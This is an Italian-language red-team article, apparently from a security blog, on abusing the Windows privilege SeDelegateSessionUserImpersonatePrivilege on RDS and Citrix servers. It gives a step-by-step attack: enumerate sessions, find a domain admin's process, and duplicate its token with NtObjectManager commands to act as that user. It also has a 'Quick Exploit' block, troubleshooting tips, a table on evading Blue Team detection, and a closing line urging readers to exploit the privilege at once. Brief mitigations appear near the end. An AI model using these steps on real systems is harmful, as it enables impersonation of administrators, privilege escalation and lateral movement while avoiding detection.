---
title: 'SeDelegateSessionUserImpersonatePrivilege: Token Stealing Cross-Session su RDS e Citrix'
slug: sedelegatesessionuserimpersonateprivilege
description: Come sfruttare SeDelegateSessionUserImpersonatePrivilege per impersonare utenti in sessioni RDS attive. Token stealing cross-session con NtObjectManager. Privesc e Tecniche Red Team.
image: /seldegatesessionuserimpersonateprivilege.webp
draft: true
date: 2026-06-16T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - privilege-escalation
tags:
  - seldegatesessionuserimpersonateprivilege
  - token-stealing
  - rds-impersonation
---

Sei su un Terminal Server con 20 utenti connessi. Hai compromesso il service account del session broker. Con SeDelegateSessionUserImpersonatePrivilege puoi impersonare qualsiasi utente in qualsiasi sessione attiva — inclusi gli admin di dominio loggati — senza aspettare che si connettano a te.

***

## Quick Exploit

```cmd
query session
tasklist /FI "SESSION eq 3"
```

```powershell
Import-Module NtObjectManager
$proc = Get-NtProcess -ProcessId 4512
$token = Get-NtToken -Process $proc -Duplicate -TokenType Impersonation -ImpersonationLevel Impersonation
Invoke-NtToken -Token $token -Script { whoami }
```

Output atteso:

```
corp\domain.admin
```

***

## Attack Chain

```
Service account RDS/Citrix compromesso
  → query session → identifica domain.admin in sessione 3
  → tasklist /FI "SESSION eq 3" → trova PID processo nella sessione
  → NtObjectManager: Get-NtProcess → Get-NtToken → Invoke-NtToken
  → accesso alle risorse dell'utente impersonato (file, app, connessioni)
```

***

## Tool Decision

| Obiettivo                                     | Strumento                                           |
| --------------------------------------------- | --------------------------------------------------- |
| Enumerazione sessioni                         | `query session` / `qwinsta`                         |
| Dettaglio sessioni (logon type, auth package) | `Seatbelt.exe LogonSessions`                        |
| Token stealing cross-session                  | `NtObjectManager` PowerShell module                 |
| Verifica privilegi token ottenuto             | `Invoke-NtToken -Token $t -Script { whoami /priv }` |

***

## Cos'è SeDelegateSessionUserImpersonatePrivilege

È un'estensione cross-session di SeImpersonatePrivilege. La differenza chiave:

* **SeImpersonatePrivilege** → reattivo: aspetti che un utente privilegiato si connetta al tuo processo, poi catturi il token
* **SeDelegateSessionUserImpersonatePrivilege** → proattivo: vai tu a impersonare utenti attivi in sessioni separate, senza che facciano nulla

Documentato da James Forshaw (Google Project Zero). Privilegio raro — quasi mai su account normali. Se lo trovi su un account compromesso non di sistema, è una scoperta significativa.

***

## Quando esiste

* **Servizi RDS (Remote Desktop Services)** — session broker service account
* **Citrix XenApp / XenDesktop** — componenti Citrix in alcune configurazioni
* **Windows Remote Management** in configurazioni specifiche

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeDelegateSessionUserImpersonatePrivilege    Obtain an impersonation token for another user in the same session    Enabled
```

***

## Step 1 — Enumera le sessioni attive

Prima identifica quali utenti sono connessi e in quale sessione:

```cmd
query session
```

Output:

```
SESSIONNAME       USERNAME              ID  STATE
console           LocalAdmin            1   Active
rdp-tcp#0         user.helpdesk         2   Active
rdp-tcp#1         domain.admin          3   Active
rdp-tcp#2         dev.user              4   Active
```

Con Seatbelt per dettagli aggiuntivi (logon type, authentication package):

```cmd
Seatbelt.exe LogonSessions
```

***

## Step 2 — Identifica i processi nella sessione target

Trova il PID di un processo nella sessione dell'utente che vuoi impersonare (es. sessione 3 — domain.admin):

```cmd
tasklist /FI "SESSION eq 3"
```

Output:

```
Image Name    PID    Session#    Mem Usage
explorer.exe  4512   3           45,000 K
notepad.exe   5123   3           12,000 K
```

***

## Step 3 — Token stealing cross-session con NtObjectManager

Installa il modulo PowerShell di James Forshaw:

```powershell
Install-Module NtObjectManager
Import-Module NtObjectManager
```

Apri un processo nella sessione target e ottieni il token di impersonation:

```powershell
$proc = Get-NtProcess -ProcessId 4512
```

```powershell
$token = Get-NtToken -Process $proc -Duplicate -TokenType Impersonation -ImpersonationLevel Impersonation
```

Poi esegui codice come l'utente impersonato:

```powershell
Invoke-NtToken -Token $token -Script {
    whoami
    # accedi a file, risorse, credenziali dell'utente target
}
```

SeDelegateSessionUserImpersonatePrivilege permette di aprire processi in sessioni diverse e ottenere token di impersonation — normalmente bloccato senza questo privilegio.

Source: [googleprojectzero/sandbox-attacksurface-analysis-tools](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)

***

## Differenza con SeDebugPrivilege su Terminal Server

* **SeDebugPrivilege** → leggi la memoria dei processi → estrai credenziali dal dump di lsass
* **SeDelegateSessionUserImpersonatePrivilege** → ottieni un token dell'utente → agisci **come** lui, accedi alle sue risorse, ai suoi file, alle sue applicazioni

I due si complementano: SeDebugPrivilege per le credenziali in memoria, questo per l'accesso alle risorse dell'utente in sessione.

***

## Scenari reali

**Citrix / RDS con admin di dominio in sessione** — service account Citrix compromesso → enumera sessioni → domain.admin in sessione 3 → token stealing → accesso alle risorse di domain admin → credenziali, file, connessioni aperte.

**Server di gestione multi-utente** — più admin si connettono allo stesso jump server. Service account del sistema di monitoring compromesso → impersona l'admin con più privilegi → lateral movement.

***

## Errori comuni

**Token ottenuto a livello Identification invece di Impersonation** — `Invoke-NtToken` fallisce con "Access Denied". Verifica il parametro `-ImpersonationLevel Impersonation` nella chiamata `Get-NtToken`. Se il processo nella sessione target ha ACL restrittive sull'handle, prova un processo diverso nella stessa sessione.

**NtObjectManager non si installa** — `Install-Module NtObjectManager` richiede PowerShellGet aggiornato. In alternativa: `Install-Module -Name NtObjectManager -Force -SkipPublisherCheck`.

**`query session` non mostra sessioni attive** — Probabilmente sei su una macchina single-user. Il vettore richiede un sistema multi-sessione (RDS, Citrix, server condiviso).

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                              | Come lo bypassa il Red Team                                                          |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------ |
| Impersonation cross-session senza Event ID 4624       | Difficile — è proprio l'assenza di logon event che rende questo vettore interessante |
| `query session` da account di servizio                | Usa `Seatbelt.exe LogonSessions` invece — pattern diverso, stesso risultato          |
| Event ID 4648 da account servizio in contesto anomalo | Opera durante orari normali di attività del servizio RDS                             |

***

## Quando fallisce

* Sistema single-user → nessuna sessione separata
* Token a livello Identification → non sufficiente. Verifica `-ImpersonationLevel`
* NtObjectManager non si carica → verifica versione PowerShell e .NET

***

## Mitigazioni

* Non assegnare il privilegio ad account diversi dai componenti RDS/Citrix strettamente necessari
* VDI con sessioni isolate per utenti privilegiati
* Separare i servizi di gestione sessioni su infrastruttura dedicata
* Monitorare `query session` da account di servizio

**Nota realistica:** Su infrastrutture RDS e Citrix enterprise questo privilegio è spesso presente su account di servizio dimenticati. La maggior parte dei security review non lo controlla esplicitamente — è uno dei finding più rari ma più impattanti in ambienti multi-sessione.

***

## FAQ

**Funziona su sistemi con un solo utente?**
No — non ci sono sessioni separate. Il vettore richiede multi-sessione.

**È mai stato sfruttato in attacchi documentati?**
Documentato da James Forshaw (Project Zero). Tool pubblici maturi sono limitati per la rarità del privilegio — ma dove esiste il contesto RDS/Citrix giusto, il vettore è reale.

***

SeDelegateSessionUserImpersonatePrivilege è un privilegio di nicchia ma critico su infrastrutture RDS e Citrix — se lo trovi su un account compromesso in un ambiente multi-sessione, sfruttalo subito.

***

**Articoli correlati:**

* [SeImpersonatePrivilege](https://hackita.it/articoli/seimpersonateprivilege) — il fratello reattivo, più comune
* [SeAssignPrimaryTokenPrivilege](https://hackita.it/articoli/seassignprimarytokenprivilege) — assegnazione token a processi figlio

**Riferimenti:** [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) · [James Forshaw - Project Zero](https://googleprojectzero.blogspot.com/) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)

Per assessment su infrastrutture RDS e Citrix: [hackita.it/servizi](https://hackita.it/servizi)
